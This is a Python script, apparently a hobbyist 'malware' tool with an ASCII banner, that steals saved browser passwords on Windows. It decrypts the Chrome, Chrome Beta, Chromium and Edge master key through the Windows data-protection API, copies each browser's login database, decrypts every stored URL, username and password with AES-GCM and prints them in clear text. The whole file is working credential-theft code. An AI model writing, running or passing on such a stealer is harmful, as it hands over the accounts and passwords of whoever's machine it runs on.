try:
    from time import sleep
    import json
    from base64 import b64decode
    import win32crypt
    import sqlite3 
    import shutil
    from Crypto.Cipher import AES
    from os import get_terminal_size, system, getcwd
    from colorama import Fore as col
    from getpass import getuser
    import datetime
except ImportError:
    try:
        system('pip install -r requirements.txt')
    except:
        exit('please install "requirements.txt"')

user = getuser()
a = str(datetime.datetime.now())
a = a[:-7]
timedate = a.replace('-', '').replace(' ', '').replace(':', '')

print(getcwd())

locationbrowser = {
    'chrome' : [
        f'C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State',
        f'C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
    ],
    'chrome-beta' : [
        f'C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome Beta\\User Data\\Local State',
        f'C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome Beta\\User Data\\Default\\'
    ],
    'chromium' : [
        f'C:\\Users\\{user}\\AppData\\Local\\Chromium\\User Data\\Local State',
        f'C:\\Users\\{user}\\AppData\\Local\\Chromium\\User Data\\Default\\'
    ],
    'edge' : [
        f'C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State',
        f'C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\'
    ],
}

system('cls')

def run(localstate, loginpath):
    f = open(localstate)
    local_state = json.loads(f.read())
    key = local_state["os_crypt"]["encrypted_key"]
    key = b64decode(key)
    key = key[5:]
    key = win32crypt.CryptUnprotectData(key)[1]
    path = loginpath
    shutil.copy(path+"Login Data" , path+"database2")
    database = sqlite3.connect(path+"database2")
    cursor = database.cursor()
    cursor.execute("select origin_url , username_value , password_value from logins")
    result = cursor.fetchall()
    def decrypt(password , key):
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key , AES.MODE_GCM , iv)
        password = cipher.decrypt(password)
        password = password[:-16].decode()
        return password
    for i in result:
        url = i[0]
        username = i[1]
        password = decrypt(i[2] , key)
        
        central('''
UrlLogin : {}
UserName : {}
Password : {}

              '''.format(url, username, password))
        
def malwer():
    for keys in locationbrowser:
        try:
            sleep(0.5)
            run(locationbrowser[keys][0],locationbrowser[keys][1])
        except FileNotFoundError:
            pass

def central(text, sleeptime=0):
    '''the central multi line'''
    text = text.split('\n')
    for item in text:
        print(item.center(get_terminal_size()[0]))
        sleep(sleeptime)

def art():
    banner = '''                                           
 _____  ______  __   _       ______  _____             
|     ||      >|  |_| | ___ |   ___||     |            
|    _||     < |   _  ||___||   |  ||    _|            
|___|  |______>|__| |_|     |______||___|     kinite-gp
    '''
    central(banner)
    
art()
sleep(3)
system('cls')
malwer()    